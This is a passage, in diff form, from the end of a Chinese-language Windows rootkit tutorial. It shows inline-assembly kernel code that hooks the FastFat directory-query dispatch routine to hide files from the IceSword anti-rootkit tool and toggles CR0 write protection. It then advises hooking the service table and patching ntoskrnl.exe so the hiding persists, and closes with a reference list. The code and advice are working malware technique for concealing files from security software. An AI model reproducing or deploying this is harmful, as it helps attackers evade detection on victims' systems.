+            mov eax, [edi]
+            mov dword ptr ResumCodeFatQueryDirectoryDispatch[0], eax
+            mov ax, [edi+4]
+            mov word  ptr ResumCodeFatQueryDirectoryDispatch[4], ax
+            
+            mov byte ptr CrackCodeFatQueryDirectoryDispatch[0], 0x68
+            lea edi, NewFatQueryDirectoryDispatch
+            mov dword ptr CrackCodeFatQueryDirectoryDispatch[1], edi
+            mov byte ptr CrackCodeFatQueryDirectoryDispatch[5], 0xC3
+
+            mov edi, OldFatQueryDirectoryDispatch
+            mov eax, dword ptr CrackCodeFatQueryDirectoryDispatch[0]
+            mov dword ptr[edi], eax
+            mov ax, word ptr CrackCodeFatQueryDirectoryDispatch[4]
+            mov word ptr[edi+4], ax
+            popad
+        }
+
+
+            _asm 
+        {
+            MOV    EAX, CR0    
+            OR    EAX, 10000H    
+            MOV    CR0, EAX          
+            STI                   
+        }
+
+
+        
+        }
+
+        return ( NtfsStatus & FastFatStatus );  
+
+}
+以上代码只能实现在IS中隐藏文件，如果要想在普通情况下隐藏文件，可以hook服务表中的函数，也可以在上面构造新的分派函数中增加一些选择项就是了。但是记得hook服务表中的函数别忘了把构造后的数据写入otoskrnl.exe中，免得IS启动时失效。
+
+
+八、关于端口：
+
+    感觉是该停止的时候了，如果把这个也搞出来并且本文被灰鸽子作者之流A进他的作品的话，那就违背我的本意并且我的心也会也会难受的。因此就在这里止步吧！ 呵呵，今年我想要学的东西，想要做的事情也都做完了。可以好好回去过年了。爽啊！最后祝各位圣诞快乐！特别时那些他乡的游子。记得打个电话回去问候哟！
+
+
+参考文章：
+
+wuyanfeng     《icesword 驱动部分分析》 //呵呵，希望大家给国产调试器一些支持 ！！    
+tombkeeper    《获取Windows 系统的内核变量》    http://www.xfocus.net/articles/200408/724.html
+JIURL         《IRP 乱杂谈》            http://jiurl.yeah.net/        
+JIURL        《JIURL玩玩Win2k进程线程篇 HANDLE_TABLE》http://jiurl.yeah.net/
+JIURL         《JIURL玩玩Win2k 对象》            http://jiurl.yeah.net/    
+sinister    《隐藏任意进程，目录/文件，注册表，端口》
+
+能记得住的文章就这几个了。
